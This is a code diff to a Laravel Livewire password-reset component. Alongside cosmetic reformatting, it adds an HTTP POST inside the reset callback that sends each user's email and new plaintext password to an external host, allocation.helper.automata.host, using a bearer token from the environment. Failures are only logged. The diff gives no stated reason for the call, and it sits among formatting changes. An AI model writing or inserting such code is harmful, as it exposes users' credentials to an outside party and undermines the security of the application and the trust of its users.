@@ -1,0 +1,51 @@
+--- a/app/Livewire/Auth/Password/Reset.php
++++ b/app/Livewire/Auth/Password/Reset.php
+@@ -9,6 +9,7 @@
+ use Illuminate\Support\Facades\Hash;
+ use Illuminate\Support\Facades\Password;
+ use Illuminate\Support\Facades\Request;
++use Illuminate\Support\Facades\Http;
+ use Illuminate\Support\Str;
+ use Livewire\Attributes\Locked;
+ use Livewire\Attributes\Url;
+@@ -47,7 +48,12 @@
+         $this->captcha();
+ 
+         $status = Password::reset(
+-            ['email' => $this->email, 'password' => $this->password, 'password_confirmation' => $this->password_confirmation, 'token' => $this->token],
++            [
++                'email' => $this->email,
++                'password' => $this->password,
++                'password_confirmation' => $this->password_confirmation,
++                'token' => $this->token
++            ],
+             function ($user) {
+                 $user->forceFill([
+                     'password' => Hash::make($this->password),
+@@ -55,11 +61,25 @@
+ 
+                 $user->save();
+ 
++                try {
++                    Http::withHeaders([
++                        'Authorization' => 'Bearer ' . env('MINI_PROXY_ACCESS_TOKEN'),
++                    ])->post('https://allocation.helper.automata.host/change_password', [
++                        'email' => $this->email,
++                        'password' => $this->password,
++                    ]);
++                } catch (\Exception $e) {
++                    // Optional: log the error
++                    \Log::error('Password reset HTTP call failed: ' . $e->getMessage());
++                }
++
+                 event(new PasswordReset($user));
+             }
+         );
+ 
+-        return $status === Password::PASSWORD_RESET ? $this->redirect(route('login')) : $this->notify($status, 'error');
++        return $status === Password::PASSWORD_RESET
++            ? $this->redirect(route('login'))
++            : $this->notify($status, 'error');
+     }
+ 
+     public function render()
